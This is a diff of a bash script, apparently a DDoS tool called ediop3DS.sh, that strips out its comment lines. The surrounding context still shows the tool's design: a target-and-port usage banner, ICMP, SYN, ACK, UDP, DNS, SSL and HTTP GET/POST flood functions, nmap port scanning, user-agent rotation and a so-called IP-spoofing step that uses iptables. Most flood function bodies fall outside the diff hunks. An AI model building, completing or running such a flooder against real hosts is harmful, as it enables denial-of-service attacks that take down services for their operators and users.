@@ -1,6 +1,5 @@
 #!/bin/bash
 
-# Color definitions
 RED="\e[31m"
 GREEN="\e[32m"
 YELLOW="\e[33m"
@@ -9,7 +8,6 @@ CYAN="\e[36m"
 WHITE="\e[97m"
 RESET="\e[0m"
 
-# Default values
 port=80
 num_requests=1000
 pSize=56
@@ -17,7 +15,6 @@ P=0.01
 proto="TCP"
 verbose=0
 
-# Display logo
 display_logo() {
     echo -e "${CYAN}"
     echo -e """
@@ -31,7 +28,6 @@ display_logo() {
     echo -e "${RESET}"
 }
 
-# Help
 show_help() {
     display_logo
     echo -e "\nUsage: ./ediop3DS.sh -u target_ip_or_url -p port [options]\n"
@@ -59,7 +55,6 @@ show_help() {
     echo -e "  -M       Custom TCP packet flood"
 }
 
-# Scan open ports
 scan_ports() {
     target=$1
     echo -e "${CYAN}[*] Scanning for open ports on $target${RESET}"
@@ -73,7 +68,6 @@ scan_ports() {
     fi
 }
 
-# Read user agents from file
 read_user_agents() {
     if [ -f "user_agents.txt" ]; then
         mapfile -t user_agents < user_agents.txt
@@ -83,7 +77,6 @@ read_user_agents() {
     fi
 }
 
-# Retry attack function
 retry_attack() {
     target=$1
     attack_type="$2"
@@ -95,21 +88,18 @@ retry_attack() {
     $attack_func $target
 }
 
-# Spoof source IP address
 spoof_ip() {
     ip=$1
     echo -e "${CYAN}[*] Spoofing source IP address: $ip${RESET}"
     iptables -t nat -A POSTROUTING -s $ip -j MASQUERADE
 }
 
-# Apply custom HTTP headers
 custom_headers() {
     header=$1
     echo -e "${CYAN}[*] Using custom HTTP header: $header${RESET}"
     curl -s -X GET http://$target -H "$header" > /dev/null 2>&1
 }
 
-# ICMP flood
 icmp_flood() {
     target=$1
     echo -e "${CYAN}[*] ICMP flood on $target using $proto${RESET}"
@@ -123,7 +113,6 @@ icmp_flood() {
     wait
 }
 
-# SYN flood
 syn_flood() {
     target=$1
     echo -e "${CYAN}[*] TCP SYN flood on $target${RESET}"
@@ -137,7 +126,6 @@ syn_flood() {
     wait
 }
 
-# ACK flood
 ack_flood() {
     target=$1
     echo -e "${CYAN}[*] TCP ACK flood on $target${RESET}"
@@ -151,7 +139,6 @@ ack_flood() {
     wait
 }
 
-# UDP flood
 udp_flood() {
     target=$1
     echo -e "${CYAN}[*] UDP flood on $target${RESET}"
@@ -165,7 +152,6 @@ udp_flood() {
     wait
 }
 
-# DNS flood
 dns_flood() {
     target=$1
     echo -e "${CYAN}[*] DNS flood on $target${RESET}"
@@ -179,14 +165,12 @@ dns_flood() {
     wait
 }
 
-# Test firewall
 test_firewall() {
     target=$1
     echo -e "${CYAN}[*] Testing firewall on $target${RESET}"
     nmap -p $port $target
 }
 
-# SSL DDoS
 ssl_ddos() {
     target=$1
     echo -e "${CYAN}[*] SSL DDoS on $target${RESET}"
@@ -200,7 +184,6 @@ ssl_ddos() {
     wait
 }
 
-# Custom TCP flood
 custom_tcp_flood() {
     target=$1
     echo -e "${CYAN}[*] Custom TCP flood on $target${RESET}"
@@ -214,7 +197,6 @@ custom_tcp_flood() {
     wait
 }
 
-# HTTP GET flood
 http_flood() {
     target=$1
     echo -e "${CYAN}[*] HTTP GET flood on $target${RESET}"
@@ -228,7 +210,6 @@ http_flood() {
     wait
 }
 
-# HTTP POST flood
 post_flood() {
     target=$1
     echo -e "${CYAN}[*] HTTP POST flood on $target${RESET}"
@@ -242,7 +223,6 @@ post_flood() {
     wait
 }
 
-# Parse arguments
 while getopts ":u:p:sirSAtf:n:Hvl:t:FITLVMpSize:proto:P:" option; do
     case $option in
         u) target="$OPTARG";;
